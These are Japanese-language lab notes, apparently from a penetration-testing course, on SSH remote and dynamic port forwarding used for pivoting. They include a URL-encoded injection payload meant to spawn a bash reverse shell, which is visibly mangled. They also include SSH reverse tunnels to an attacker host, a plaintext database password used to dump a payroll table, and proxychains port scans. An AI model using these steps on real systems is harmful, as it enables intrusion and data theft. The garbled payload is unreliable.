#  SSHリモートポート転送
![[Pasted image 20260508224025.png]]

## SSH Server
```bash
sudo systemctl start ssh

sudo ss -ntplu
```
![[Pasted image 20260508224035.png]]

ユーザー名とパスワードを使用して Kali SSH サーバーに接続するには、/etc/ssh/sshd_configで PasswordAuthentication をyesに設定して、パスワードベースの認証を明示的に許可する必要がある場合があります。

Kali
```bash
rlwrap -nlvp 4444

curl http://192.168.158.63:8090/%24%7Bnew%20javax.script.ScriptEngi%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%270%3E%261%27%29.start%28%29%22%29%7D/
```

## SSH Remote Port Forwarding

Victim
```bash
#Victim 
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:5432 kali@192.168.45.236
```

Kali
```
ss -ntplu
```
![[Pasted image 20260508224045.png]]
## Database Access
kali
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
D@t4basePassw0rd!

\l
```
![[Pasted image 20260508224055.png]]
## Lab1
```bash
\c hr_backup

select * from payroll;
```
![[Pasted image 20260508224102.png]]

## Lab2
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'

ssh -N -R 127.0.0.1:2345:10.4.158.215:4444 kali@192.168.45.236

chmod 777 2e345e06246bd4465204327a6d6892a5-ssh_remote_client

./2e345e06246bd4465204327a6d6892a5-ssh_remote_client -p 2345
```
![[Pasted image 20260508224111.png]]


# SSHリモートダイナミックポートフォワーディング
![[Pasted image 20260508224146.png]]
リモートダイナミックポートフォワーディングは、2017年10月のOpenSSH 7.6以降でのみ利用可能になりました。ただし、この機能を使用するにはOpenSSHクライアントのバージョンが7.6以上である必要があります。サーバーのバージョンは関係ありません。

![[Pasted image 20260508224153.png]]

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.45.236

tail /etc/proxychains.conf
```
![[Pasted image 20260508224201.png]]

```bash
proxychains nmap -vvv -sT -p9000-9100 -Pn -n 10.4.158.64

#nmapがダメな時の代替手段
proxychains -q nc -zv 10.4.158.64 9000-9100 -w 3
```
![[Pasted image 20260508224206.png]]
## Lab
```bash
chmod 777 ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client

proxychains ./ffeb2f612236b516f854380ff9b73ee2-ssh_remote_dynamic_client -i 10.4.158.64 -p 9062
```
![[Pasted image 20260508224212.png]]
